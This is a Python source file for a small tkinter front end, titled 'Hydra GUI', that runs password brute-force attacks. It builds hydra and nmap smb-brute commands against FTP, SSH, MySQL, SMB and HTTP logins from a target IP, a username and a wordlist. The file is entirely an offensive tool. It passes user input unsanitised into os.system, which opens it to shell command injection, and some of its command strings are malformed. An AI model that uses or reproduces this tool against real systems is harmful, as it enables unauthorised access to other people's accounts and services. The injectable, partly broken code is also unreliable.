import os
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog

def start_bruteforce():
    ip = ip_entry.get()
    username = username_entry.get()
    wordlist = wordlist_path
    attack = attack_dropdown.get()
    bruteforce(ip, username, wordlist, attack)

def bruteforce(ip, username, wordlist, attack):
    os.system("clear")
    print(f"Starting {attack} Bruteforce Attack on {ip} with username {username} and wordlist: {wordlist}\n")

    if attack == "FTP":
        os.system(f"hydra -l {username} -P {wordlist} ftp://{ip}")
    elif attack == "SSH":
        os.system(f"hydra -l {username} -P {wordlist} ssh://{ip}")
    elif attack == "MySQL":
        os.system(f"hydra -l {username} -P {wordlist} mysql://{ip}")
    elif attack == "SMB - HYDRA":
        os.system(f"hydra -L {username} -P {wordlist} smb://{ip}")
    elif attack == "SMB - NMAP":
        os.system(f"nmap --script smb-brute -p 445 --script-args smb-brute.user='{username}',smb-brute.password='{wordlist}' {ip}")
    elif attack == "HTTP - FORM":
        os.system(f"hydra -L {username} -P {wordlist} http-post-form://{ip}:80/login:'username=^USER^&password=^PASS^&submit=Login:F=incorrect'")
    elif attack == "HTTP - BASIC":
        os.system(f"hydra -L {username} -P {wordlist} http:// {ip}")

window = tk.Tk()
window.title("Hydra GUI")
window.geometry("500x300")

# Labels
ip_label = tk.Label(window, text="IP Address")
ip_label.grid(row=0, column=0, padx=10, pady=10)

username_label = tk.Label(window, text="Username")
username_label.grid(row=1, column=0, padx=10, pady=10)

wordlist_label = tk.Label(window, text="Wordlist")
wordlist_label.grid(row=2, column=0, padx=10, pady=10)

attack_label = tk.Label(window, text="Attack")
attack_label.grid(row=3, column=0, padx=10, pady=10)

# Entry Boxes
ip_entry = tk.Entry(window, width=30)
ip_entry.grid(row=0, column=1, padx=10, pady=10)

username_entry = tk.Entry(window, width=30)
username_entry.grid(row=1, column=1, padx=10, pady=10)

wordlist_entry = tk.Entry(window, width=30, state='readonly')
wordlist_entry.grid(row=2, column=1, padx=10, pady=10)

# Dropdown List
attack_options = ["FTP", "SSH", "MySQL", "SMB - HYDRA", "SMB - NMAP", "HTTP - FORM", "HTTP - BASIC"]
attack_dropdown = ttk.Combobox(window, value=attack_options, width=27)
attack_dropdown.grid(row=3, column=1, padx=10, pady=10)


def browse_wordlist():
    global wordlist_path
    file_path = filedialog.askopenfilename(filetypes=[('Text Files', '*.txt')])
    wordlist_entry.configure(state='normal')
    wordlist_entry.delete(0, tk.END)
    wordlist_entry.insert(0, file_path)
    wordlist_entry.configure(state='readonly')
    wordlist_path = file_path

browse_button = tk.Button(window, text="Browse", command=browse_wordlist)
browse_button.grid(row=2, column=2, padx=10, pady=1)

# Button
submit_button = tk.Button(window, text="Start Bruteforce", command=start_bruteforce)
submit_button.grid(row=4, column=0, columnspan=2, padx=10, pady=10) 

wordlist_path = ""

window.mainloop()
